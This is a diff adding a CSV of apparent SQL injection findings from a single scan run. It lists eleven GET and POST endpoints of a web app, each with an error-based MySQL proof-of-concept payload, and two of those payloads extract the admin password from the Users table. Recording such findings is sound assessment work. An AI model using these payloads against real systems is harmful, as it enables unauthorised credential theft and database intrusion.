@@ -1,0 +1,12 @@
+run_id,endpoint,vulnerability,poc
+20260902-2158-0001,`GET /profile?username=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin')),1)-- `"
+20260902-2158-0001,`GET /users?search=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,(SELECT password FROM Users WHERE username='admin')),1)-- `"
+20260902-2158-0001,`GET /posts?search=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,1),1)-- `"
+20260902-2158-0001,`GET /friends?username=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,1),1)-- `"
+20260902-2158-0001,`GET /requests?username=`,SQL Injection,"`' AND updatexml(1,concat(0x7e,1),1)-- `"
+20260902-2158-0001,`GET /edit_post?id=`,SQL Injection,"`1' AND updatexml(1,concat(0x7e,1),1)-- `"
+20260902-2158-0001,`GET /delete_post?id=`,SQL Injection,"`1' AND updatexml(1,concat(0x7e,1),1)-- `"
+20260902-2158-0001,`POST /request_friend` (username),SQL Injection,"`' AND updatexml(1,concat(0x7e,1),1)-- `"
+20260902-2158-0001,`POST /remove_request` (username),SQL Injection,"`' AND updatexml(1,concat(0x7e,1),1)-- `"
+20260902-2158-0001,`POST /create_post` (content),SQL Injection,"`test' AND updatexml(1,concat(0x7e,1),1)-- `"
+20260902-2158-0001,`POST /edit_post` (id),SQL Injection,"`1' AND updatexml(1,concat(0x7e,1),1)-- `"
